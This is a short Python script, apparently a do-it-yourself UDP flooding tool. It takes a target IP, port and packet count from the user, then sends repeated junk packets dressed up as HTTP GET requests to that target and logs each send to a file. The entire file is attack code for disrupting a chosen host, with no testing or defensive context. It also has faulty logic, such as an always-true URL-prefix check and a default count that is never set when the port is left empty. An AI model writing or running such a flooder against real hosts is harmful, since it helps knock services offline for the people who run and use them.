import socket,time,sys,os
from requests import get
print("checking for network")
try:
    get("https://google.com",timeout = 3)
    print("connected")
except:
    print("failed")
    time.sleep(1)
    sys.exit()
IP = input("Enter the ip: ")
port = input("Enter the port: ")
v = input("Enter the count: ")
if "https://" or "http://" in IP:
    IP = IP.replace("https://","")
    IP = IP.replace("http://","")
os.system('cls')
portb=bool(port)
vb=bool(v)
if portb is False:
    port = 80
elif vb is False:
    v = 500
IP = socket.gethostbyname(IP)
print(IP,":",port)
time.sleep(2)
a = open("log("+time.ctime().replace(":","-")+").txt",'a')
a.write(IP+":"+str(port)+"\n\n")
for i in range(1,int(v)):
        s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
        try:
            s.connect((IP , int(port)))
            s.settimeout(1)
            pack = 'BBBBB'*100
            pack = 'GET / HTTP 1.1\r\n' + pack
            s.sendto(pack.encode('utf-8'),(IP, int(port)))
            sys.stdout.write("\rSend Packet %d" % i)
            sys.stdout.flush()
            
            a.write("Send Packet %d   %s\n" % (i,time.ctime()))
            time.sleep(1)
        except Exception as e:
            print("~ERROR@",e)
            a.close()
            input()
            sys.exit()
s.close()
#opensource developer

